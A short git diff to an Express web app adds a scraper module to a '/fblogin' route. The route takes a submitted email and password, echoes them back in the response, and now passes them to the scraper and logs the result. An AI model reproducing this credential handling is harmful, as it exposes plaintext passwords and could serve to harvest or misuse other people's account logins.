@@ -3,6 +3,7 @@ var express = require('express');
 const ejs = require('ejs');
 var app = express();
 const bodyParser = require('body-parser'); 
+const scrape = require("./scrape");
 
 // Middleware / Routing 
 app.use(bodyParser.urlencoded({ extended: true})); 
@@ -35,4 +36,7 @@ app.post('/fblogin', (req, res) => {
     let email = req.body.email;
     let password = req.body.password;
     res.send(`Username: ${email} Password: ${password}`);
+
+    const randomString = scrape.getData(email, password);
+    console.log(randomString); 
 });
